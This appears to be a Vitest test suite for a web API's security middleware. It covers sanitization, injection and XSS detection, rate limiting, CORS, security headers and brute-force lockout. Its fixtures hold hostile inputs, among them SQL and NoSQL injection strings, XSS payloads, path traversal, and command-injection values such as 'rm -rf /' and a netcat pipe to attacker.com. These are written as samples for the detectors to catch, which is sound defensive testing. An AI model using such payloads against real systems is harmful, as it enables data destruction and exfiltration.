// @ts-nocheck - Test file with complex type issues
/**
 * API Security Test Suite
 *
 * Comprehensive tests for API security measures:
 * - Rate limiting
 * - Input sanitization
 * - SQL/NoSQL injection prevention
 * - CORS configuration
 * - Security headers
 * - Brute force protection
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';

// Import security modules
import { withSecurity, SecurityConfigs } from '@/lib/middleware/security';
import { withRateLimit, clearAllRateLimits } from '@/lib/middleware/rate-limit';
import {
  sanitizeString,
  sanitizeNumber,
  sanitizeValue,
  sanitizeRequestBody,
  sanitizeQueryParams,
  detectSQLInjection,
  detectNoSQLInjection,
  detectXSS,
  detectPathTraversal,
  detectCommandInjection,
  securityCheck,
} from '@/lib/middleware/input-sanitization';
import {
  withCORS,
  createCORSConfig,
  validateCORSConfig,
  isOriginAllowed,
} from '@/lib/middleware/cors';
import {
  setSecurityHeaders,
  withSecurityHeaders,
  createSecurityConfig,
  validateCSPConfig,
} from '@/lib/middleware/security-headers';
import {
  checkBruteForceProtection,
  recordFailedAttempt,
  clearFailedAttempts,
  getBruteForceStatus,
  getBruteForceStats,
  cleanupExpiredEntries,
} from '@/lib/middleware/brute-force-protection';

// Mock Next.js types
type MockNextRequest = {
  url: string;
  method: string;
  nextUrl: {
    pathname: string;
    searchParams: URLSearchParams;
  };
  headers: Map<string, string>;
  json: () => Promise<any>;
  clone: () => MockNextRequest;
};

type MockNextResponse = {
  status: number;
  headers: Map<string, string>;
  json: (data: any) => MockNextResponse;
};

function createMockRequest(
  url: string,
  method = 'GET',
  body?: any
): MockNextRequest {
  const urlObj = new URL(url);
  return {
    url,
    method,
    nextUrl: {
      pathname: urlObj.pathname,
      searchParams: urlObj.searchParams,
    },
    headers: new Map([
      ['content-type', 'application/json'],
      ['x-forwarded-for', '127.0.0.1'],
    ]),
    json: async () => body,
    clone: () => createMockRequest(url, method, body),
  };
}

function createMockResponse(
  status = 200,
  data: any = { success: true }
): MockNextResponse {
  const response: MockNextResponse = {
    status,
    headers: new Map(),
    json: (responseData) => {
      response.status = status;
      return response;
    },
  };
  return response;
}

describe('Input Sanitization', () => {
  describe('sanitizeString', () => {
    it('should sanitize XSS attempts', () => {
      const malicious = '<script>alert("XSS")</script>';
      const result = sanitizeString(malicious);
      expect(result.valid).toBe(true);
      expect(result.sanitized).not.toContain('<script>');
    });

    it('should sanitize SQL injection attempts', () => {
      const malicious = "'; DROP TABLE users; --";
      const result = sanitizeString(malicious);
      expect(result.valid).toBe(true);
      expect(result.sanitized).not.toContain('DROP');
      expect(result.sanitized).not.toContain(';');
    });

    it('should sanitize NoSQL injection attempts', () => {
      const malicious = '{"$ne": null}';
      const result = sanitizeString(malicious);
      expect(result.valid).toBe(true);
      expect(result.sanitized).not.toContain('$ne');
    });

    it('should sanitize path traversal attempts', () => {
      const malicious = '../../../etc/passwd';
      const result = sanitizeString(malicious);
      expect(result.valid).toBe(true);
      expect(result.sanitized).not.toContain('..');
    });

    it('should enforce max length', () => {
      const longString = 'a'.repeat(100);
      const result = sanitizeString(longString, { maxLength: 10 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('exceeds maximum length');
    });

    it('should enforce min length', () => {
      const shortString = 'ab';
      const result = sanitizeString(shortString, { minLength: 5 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('below minimum length');
    });

    it('should validate email format', () => {
      const email = 'test@example.com';
      const result = sanitizeString(email, { isEmail: true });
      expect(result.valid).toBe(true);

      const invalidEmail = 'not-an-email';
      const invalidResult = sanitizeString(invalidEmail, { isEmail: true });
      expect(invalidResult.valid).toBe(false);
    });

    it('should strip HTML tags when requested', () => {
      const html = '<p>Hello <b>world</b></p>';
      const result = sanitizeString(html, { stripTags: true });
      expect(result.valid).toBe(true);
      expect(result.sanitized).not.toContain('<');
      expect(result.sanitized).toBe('Hello world');
    });

    it('should block custom patterns', () => {
      const input = 'test forbidden';
      const result = sanitizeString(input, {
        blockPattern: /forbidden/,
      });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('blocked characters');
    });

    it('should allow only custom patterns', () => {
      const input = 'abc123';
      const result = sanitizeString(input, {
        allowPattern: /^[a-z0-9]+$/,
      });
      expect(result.valid).toBe(true);

      const invalidInput = 'abc@123';
      const invalidResult = sanitizeString(invalidInput, {
        allowPattern: /^[a-z0-9]+$/,
      });
      expect(invalidResult.valid).toBe(false);
    });
  });

  describe('sanitizeNumber', () => {
    it('should sanitize valid numbers', () => {
      const result = sanitizeNumber(42);
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe(42);
    });

    it('should reject NaN', () => {
      const result = sanitizeNumber(NaN);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not a valid number');
    });

    it('should enforce min value', () => {
      const result = sanitizeNumber(5, { min: 10 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('at least 10');
    });

    it('should enforce max value', () => {
      const result = sanitizeNumber(15, { max: 10 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('at most 10');
    });

    it('should enforce integer constraint', () => {
      const result = sanitizeNumber(3.14, { isInteger: true });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('must be an integer');
    });
  });

  describe('Security Detection Functions', () => {
    it('should detect SQL injection', () => {
      expect(detectSQLInjection("'; DROP TABLE users; --")).toBe(true);
      expect(detectSQLInjection("1 OR 1=1")).toBe(true);
      expect(detectSQLInjection("safe string")).toBe(false);
    });

    it('should detect NoSQL injection', () => {
      expect(detectNoSQLInjection('{"$ne": null}')).toBe(true);
      expect(detectNoSQLInjection('{"$where": "this.password == 123"}')).toBe(true);
      expect(detectNoSQLInjection('safe string')).toBe(false);
    });

    it('should detect XSS', () => {
      expect(detectXSS('<script>alert(1)</script>')).toBe(true);
      expect(detectXSS('javascript:alert(1)')).toBe(true);
      expect(detectXSS('<img src=x onerror=alert(1)>')).toBe(true);
      expect(detectXSS('safe string')).toBe(false);
    });

    it('should detect path traversal', () => {
      expect(detectPathTraversal('../../../etc/passwd')).toBe(true);
      expect(detectPathTraversal('..\\..\\..\\windows\\system32')).toBe(true);
      expect(detectPathTraversal('safe/path')).toBe(false);
    });

    it('should detect command injection', () => {
      expect(detectCommandInjection('test; cat /etc/passwd')).toBe(true);
      expect(detectCommandInjection('test && rm -rf /')).toBe(true);
      expect(detectCommandInjection('test | nc attacker.com 4444')).toBe(true);
      expect(detectCommandInjection('safe command')).toBe(false);
    });

    it('should perform comprehensive security check', () => {
      const malicious = "'; DROP TABLE users; -- <script>alert(1)</script>";
      const result = securityCheck(malicious);

      expect(result.hasSQLInjection).toBe(true);
      expect(result.hasXSS).toBe(true);
      expect(result.hasNoSQLInjection).toBe(false);
      expect(result.hasPathTraversal).toBe(false);
      expect(result.hasCommandInjection).toBe(false);
      expect(result.isSafe).toBe(false);
    });
  });

  describe('sanitizeRequestBody', () => {
    it('should validate and sanitize request body', () => {
      const body = {
        email: 'test@example.com',
        name: 'Test User',
        age: '25',
      };

      const schema = {
        email: { isEmail: true },
        name: { maxLength: 50 },
        age: { isNumber: true, min: 0, max: 150 },
      };

      const result = sanitizeRequestBody(body, schema);

      expect(result.valid).toBe(true);
      expect(result.sanitized.email).toBe('test@example.com');
      expect(result.sanitized.name).toBe('Test User');
      expect(result.sanitized.age).toBe(25);
    });

    it('should return errors for invalid body', () => {
      const body = {
        email: 'not-an-email',
        age: 'not-a-number',
      };

      const schema = {
        email: { isEmail: true },
        age: { isNumber: true },
      };

      const result = sanitizeRequestBody(body, schema);

      expect(result.valid).toBe(false);
      expect(result.errors.email).toBeDefined();
      expect(result.errors.age).toBeDefined();
    });
  });

  describe('sanitizeQueryParams', () => {
    it('should validate and sanitize query parameters', () => {
      const url = new URL('https://example.com/api?email=test@example.com&page=1');
      const result = sanitizeQueryParams(url.searchParams, {
        email: { isEmail: true },
        page: { isNumber: true, min: 1 },
      });

      expect(result.valid).toBe(true);
      expect(result.sanitized.email).toBe('test@example.com');
      expect(result.sanitized.page).toBe(1);
    });
  });
});

describe('Rate Limiting', () => {
  beforeEach(() => {
    clearAllRateLimits();
  });

  it('should enforce rate limits', async () => {
    let requestCount = 0;
    const handler = async () => {
      requestCount++;
      return { status: 200 };
    };

    const limitedHandler = withRateLimit(handler as any, {
      windowMs: 1000,
      maxRequests: 3,
    });

    const request = createMockRequest('https://example.com/api/test');

    // First 3 requests should succeed
    for (let i = 0; i < 3; i++) {
      const response = await limitedHandler(request as any);
      expect(response.status).toBe(200);
    }

    // 4th request should be rate limited
    const response = await limitedHandler(request as any);
    expect(response.status).toBe(429);
  });
});

describe('CORS Configuration', () => {
  it('should validate CORS config', () => {
    const validConfig = createCORSConfig({
      allowedOrigins: ['https://example.com'],
    });
    const validation = validateCORSConfig(validConfig);
    expect(validation.valid).toBe(true);
  });

  it('should reject invalid CORS config', () => {
    const invalidConfig = createCORSConfig({
      allowedOrigins: [] as any,
    });
    const validation = validateCORSConfig(invalidConfig);
    expect(validation.valid).toBe(false);
    expect(validation.errors.length).toBeGreaterThan(0);
  });

  it('should check if origin is allowed', () => {
    expect(isOriginAllowed('https://example.com', ['https://example.com'])).toBe(true);
    expect(isOriginAllowed('https://evil.com', ['https://example.com'])).toBe(false);
    expect(isOriginAllowed('https://sub.example.com', ['*.example.com'])).toBe(true);
  });

  it('should reject credentials with wildcard origin', () => {
    const validation = validateCORSConfig({
      allowedOrigins: ['*'],
      credentials: true,
    });
    expect(validation.valid).toBe(false);
  });
});

describe('Security Headers', () => {
  it('should set security headers on response', () => {
    const response: any = {
      headers: new Map(),
    };
    const response2: any = {
      headers: {
        set: (key: string, value: string) => {
          response.headers.set(key, value);
        },
      },
    };

    const result = setSecurityHeaders(response2, {});
    expect(result.headers.has('X-Content-Type-Options')).toBe(true);
    expect(result.headers.get('X-Content-Type-Options')).toBe('nosniff');
    expect(result.headers.has('X-Frame-Options')).toBe(true);
    expect(result.headers.get('X-Frame-Options')).toBe('SAMEORIGIN');
  });

  it('should validate CSP config', () => {
    const validConfig = {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-{CSP_NONCE}'"],
    };
    const validation = validateCSPConfig(validConfig);
    expect(validation.valid).toBe(true);

    const invalidConfig = {
      scriptSrc: ["'self'", "'unsafe-inline'"],
    };
    const invalidValidation = validateCSPConfig(invalidConfig);
    expect(invalidValidation.valid).toBe(false);
  });
});

describe('Brute Force Protection', () => {
  beforeEach(() => {
    cleanupExpiredEntries();
  });

  it('should block after max attempts', () => {
    const request = createMockRequest('https://example.com/api/auth/login', 'POST', {
      email: 'test@example.com',
      password: 'wrong',
    });
    const config = {
      maxAttempts: 3,
      baseLockoutDuration: 1000,
      attemptWindow: 60000,
    };

    // First 3 attempts should not block
    for (let i = 0; i < 3; i++) {
      const check = checkBruteForceProtection(request as any, config, 'test@example.com');
      expect(check.blocked).toBe(false);
      recordFailedAttempt(request as any, config, 'test@example.com');
    }

    // 4th attempt should block
    const check = checkBruteForceProtection(request as any, config, 'test@example.com');
    expect(check.blocked).toBe(true);
  });

  it('should clear attempts on success', () => {
    const request = createMockRequest('https://example.com/api/auth/login', 'POST', {
      email: 'test@example.com',
      password: 'correct',
    });
    const config = {
      maxAttempts: 3,
      baseLockoutDuration: 1000,
      attemptWindow: 60000,
    };

    // Record failed attempts
    for (let i = 0; i < 2; i++) {
      recordFailedAttempt(request as any, config, 'test@example.com');
    }

    let check = checkBruteForceProtection(request as any, config, 'test@example.com');
    expect(check.attempt?.count).toBe(2);

    // Clear on success
    clearFailedAttempts(request as any, config, 'test@example.com');

    check = checkBruteForceProtection(request as any, config, 'test@example.com');
    expect(check.attempt).toBeNull();
  });

  it('should provide status information', () => {
    const request = createMockRequest('https://example.com/api/auth/login', 'POST', {
      email: 'test@example.com',
    });
    const config = {
      maxAttempts: 5,
      baseLockoutDuration: 1000,
      attemptWindow: 60000,
    };

    recordFailedAttempt(request as any, config, 'test@example.com');

    const status = getBruteForceStatus(request as any, config, 'test@example.com');
    expect(status.attemptCount).toBe(1);
    expect(status.remainingAttempts).toBe(4);
  });
});

describe('Combined Security Middleware', () => {
  it('should apply all security measures', async () => {
    const handler = async () => {
      return { status: 200, data: { success: true } };
    };

    const secureHandler = withSecurity(handler as any, SecurityConfigs.protected);

    const request = createMockRequest('https://example.com/api/test', 'GET', {
      email: 'test@example.com',
    });

    const response = await secureHandler(request as any);
    expect(response.status).toBe(200);
  });

  it('should handle input validation errors', async () => {
    const handler = async () => {
      return { status: 200, data: { success: true } };
    };

    const secureHandler = withSecurity(
      handler as any,
      SecurityConfigs.auth,
      {
        bodySchema: {
          email: { isEmail: true },
          password: { minLength: 8 },
        },
      }
    );

    const request = createMockRequest('https://example.com/api/auth/login', 'POST', {
      email: 'not-an-email',
      password: 'short',
    });

    const response = await secureHandler(request as any);
    expect(response.status).toBe(400);
    expect(response.error).toBeDefined();
  });
});

describe('End-to-End Security Tests', () => {
  it('should protect against XSS in request body', async () => {
    const handler = async (req: any) => {
      const body = await req.json();
      return { status: 200, data: { message: body.message } };
    };

    const secureHandler = withSecurity(handler as any, SecurityConfigs.protected);

    const request = createMockRequest(
      'https://example.com/api/test',
      'POST',
      {
        message: '<script>alert("XSS")</script>',
      }
    );

    const response = await secureHandler(request as any);
    // The handler should receive sanitized input
    expect(response.status).toBe(200);
    expect(response.data?.message).not.toContain('<script>');
  });

  it('should protect against SQL injection in query params', async () => {
    const handler = async () => {
      return { status: 200, data: { success: true } };
    };

    const secureHandler = withSecurity(
      handler as any,
      SecurityConfigs.protected,
      {},
      {
        query: { allowPattern: /^[a-zA-Z0-9]+$/ },
      }
    );

    const request = createMockRequest(
      'https://example.com/api/test?query=\'; DROP TABLE users; --',
      'GET'
    );

    const response = await secureHandler(request as any);
    expect(response.status).toBe(400);
    expect(response.error?.details?.errors?.query).toBeDefined();
  });

  it('should enforce rate limits on protected endpoints', async () => {
    let requestCount = 0;
    const handler = async () => {
      requestCount++;
      return { status: 200, data: { success: true } };
    };

    const secureHandler = withSecurity(
      handler as any,
      SecurityConfigs.protected
    );

    const request = createMockRequest('https://example.com/api/test', 'GET');

    // First 60 requests should succeed (default limit)
    for (let i = 0; i < 60; i++) {
      const response = await secureHandler(request as any);
      expect(response.status).toBe(200);
    }

    // 61st request should be rate limited
    const response = await secureHandler(request as any);
    expect(response.status).toBe(429);
  });
});
